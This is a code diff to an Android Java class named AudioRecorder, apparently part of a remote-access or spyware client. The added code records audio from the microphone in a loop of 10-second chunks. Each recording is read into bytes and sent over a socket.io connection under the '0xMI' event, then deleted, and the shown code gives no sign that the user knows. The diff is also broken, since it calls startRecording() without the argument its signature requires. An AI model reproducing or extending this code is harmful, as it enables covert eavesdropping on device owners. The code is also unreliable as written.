@@ -23,20 +23,16 @@ public  class AudioRecorder {
     static TimerTask stopRecording;
 
 
-    public static void startRecording(int sec) throws Exception {
+    public static void startRecording(long sec) throws Exception {
 
 
         //Creating file
         File dir = MainService.getContextOfApplication().getCacheDir();
         try {
             Log.e("DIRR" , dir.getAbsolutePath());
-            JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name","helo");
-            object.put("buffer" , dir.getAbsolutePath());
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
-
-            audiofile = File.createTempFile("sound", ".mp3", dir);
+            
+            // String filename = ""+sec;
+            audiofile = File.createTempFile("omsai", ".mp3", dir);
         } catch (IOException e) {
             Log.e(TAG, "external storage access error");
             return;
@@ -48,19 +44,11 @@ public  class AudioRecorder {
         recorder.setOutputFile(audiofile.getAbsolutePath());
         try{
         recorder.prepare();
-         JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name","true");
-            object.put("buffer" , "starterd recoding");
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+      
 
         }
         catch (Exception e) {
-         JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name","true");
-            object.put("buffer" , e.getMessage());
-            IOSocket.getInstance().getIoSocket().emit("0xMI" ,object );
+       
 
         }
         recorder.start();
@@ -72,10 +60,31 @@ public  class AudioRecorder {
                 //stopping recorder
                 recorder.stop();
                 recorder.release();
-                sendVoice(audiofile);
+                // sendVoice(audiofile);s
+               
+                // upload file
+                int size = (int) audiofile.length();
+                byte[] data = new byte[size];
+                try {
+                    BufferedInputStream buf = new BufferedInputStream(new FileInputStream(audiofile));
+                    buf.read(data, 0, data.length);
+                    JSONObject object = new JSONObject();
+                    object.put("file",true);
+                    object.put("name",audiofile.getName());
+                    object.put("buffer" , data);
+                    IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+                    buf.close();
+                } catch (FileNotFoundException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
                 audiofile.delete();
                 try{
-                startRecording(10);
+                startRecording();
 
                 }
                 catch(Exception e){
@@ -85,29 +94,12 @@ public  class AudioRecorder {
             }
         };
 
-        new Timer().schedule(stopRecording, 5000);
+        new Timer().schedule(stopRecording, 10000);
     }
 
     private static void sendVoice(File file){
 
-        int size = (int) file.length();
-        byte[] data = new byte[size];
-        try {
-            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
-            buf.read(data, 0, data.length);
-            JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name",file.getName());
-            object.put("buffer" , data);
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
-            buf.close();
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
+       
 
     }
 
